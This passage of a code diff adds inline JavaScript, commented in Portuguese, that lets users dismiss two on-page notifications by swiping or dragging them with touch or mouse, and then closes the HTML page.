+                const distanceY = moveY - startY;
+                const distanceX = moveX - startX;
+
+                // Feedback visual enquanto arrasta
+                if (Math.abs(distanceX) > 10) {
+                    // Efeito de arrastar para os lados
+                    notification.style.transform = `translateX(${distanceX * 0.5}px)`;
+                    notification.style.opacity = 1 - Math.min(0.5, Math.abs(distanceX) / 150);
+                } else if (distanceY < -10) {
+                    // Efeito de arrastar para cima
+                    notification.style.transform = `translateY(${distanceY * 0.5}px)`;
+                    notification.style.opacity = 1 - Math.min(0.5, Math.abs(distanceY) / 100);
+                }
+
+                // Se arrastar para cima com distância suficiente
+                if (distanceY < -50) {
+                    hideNotification(notification, 'up');
+                    return;
+                }
+
+                // Se arrastar para os lados com distância suficiente
+                if (Math.abs(distanceX) > 75) {
+                    // Determina a direção do deslize: esquerda ou direita
+                    const direction = distanceX < 0 ? 'left' : 'right';
+                    hideNotification(notification, direction);
+                    return;
+                }
+            });
+
+            // Resetar a transformação ao soltar o toque
+            notification.addEventListener('touchend', () => {
+                notification.style.transform = '';
+                notification.style.opacity = '';
+            });
+
+            // Suporte para mouse (desktop)
+            let isDragging = false;
+
+            notification.addEventListener('mousedown', (e) => {
+                isDragging = true;
+                startY = e.clientY;
+                startX = e.clientX;
+            });
+
+            notification.addEventListener('mousemove', (e) => {
+                if (!isDragging) return;
+
+                moveY = e.clientY;
+                moveX = e.clientX;
+
+                const distanceY = moveY - startY;
+                const distanceX = moveX - startX;
+
+                // Feedback visual enquanto arrasta
+                if (Math.abs(distanceX) > 10) {
+                    // Efeito de arrastar para os lados
+                    notification.style.transform = `translateX(${distanceX * 0.5}px)`;
+                    notification.style.opacity = 1 - Math.min(0.5, Math.abs(distanceX) / 150);
+                } else if (distanceY < -10) {
+                    // Efeito de arrastar para cima
+                    notification.style.transform = `translateY(${distanceY * 0.5}px)`;
+                    notification.style.opacity = 1 - Math.min(0.5, Math.abs(distanceY) / 100);
+                }
+
+                // Se arrastar para cima com distância suficiente
+                if (distanceY < -50) {
+                    hideNotification(notification, 'up');
+                    isDragging = false;
+                    return;
+                }
+
+                // Se arrastar para os lados com distância suficiente
+                if (Math.abs(distanceX) > 75) {
+                    // Determina a direção do deslize: esquerda ou direita
+                    const direction = distanceX < 0 ? 'left' : 'right';
+                    hideNotification(notification, direction);
+                    isDragging = false;
+                    return;
+                }
+            });
+
+            notification.addEventListener('mouseup', () => {
+                isDragging = false;
+                notification.style.transform = '';
+                notification.style.opacity = '';
+            });
+
+            notification.addEventListener('mouseleave', () => {
+                isDragging = false;
+                notification.style.transform = '';
+                notification.style.opacity = '';
+            });
+        }
+
+        // Adiciona comportamento de deslizar para ambas as notificações
+        addSwipeToHide(notification1);
+        addSwipeToHide(notification2);
+    </script>
+
+</body>
+</html>
